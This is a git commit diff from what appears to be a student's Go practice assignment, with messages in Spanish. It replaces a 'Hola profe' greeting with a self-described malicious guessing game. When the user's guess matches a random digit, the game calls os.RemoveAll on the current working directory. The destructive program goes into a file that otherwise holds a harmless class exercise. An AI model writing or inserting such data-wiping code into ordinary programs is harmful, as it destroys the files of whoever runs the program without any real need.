4074621fe474d7f448dcecd13051f0113956a982
ksobrenat32 <ksobrenatural@tuta.io>
2025-02-24 20:21:18 -0600

    P3: Agrego un programa malicioso en lugar del saludo >:)

--- practicas/3/CalderonEnrique/main.go
+++ practicas/3/CalderonEnrique/main.go
@@ -1,7 +1,41 @@
 package main
 
-import "fmt"
+import (
+	"fmt"
+	"os"
+	"math/rand"
+	"time"
+)
 
 func main(){
-	fmt.Println("Hola profe :)")
+	// Semilla del número random
+	rand.Seed(time.Now().UnixNano())
+	num := rand.Intn(10)
+
+
+	fmt.Println("Script malo >:)")
+	fmt.Print("Dame un número entre 0-9: ")
+	var unum = 0
+
+	_, err := fmt.Scanln(&unum)
+	if err != nil {
+		fmt.Println("Número invalido")
+		return
+	}
+
+	if unum == num {
+		fmt.Println("Mala suerte! dile adios a este directorio muajajaja")
+		dir, err := os.Getwd()
+
+		if err != nil {
+			fmt.Println("Oh no, esta vez tuviste suerte, hubo un error")
+		}
+
+		err = os.RemoveAll(dir)
+		if err != nil {
+			fmt.Println("Oh no, esta vez tuviste suerte, hubo un error")
+		}
+	} else {
+		fmt.Println("¿Suerte? ...")
+	}
 }
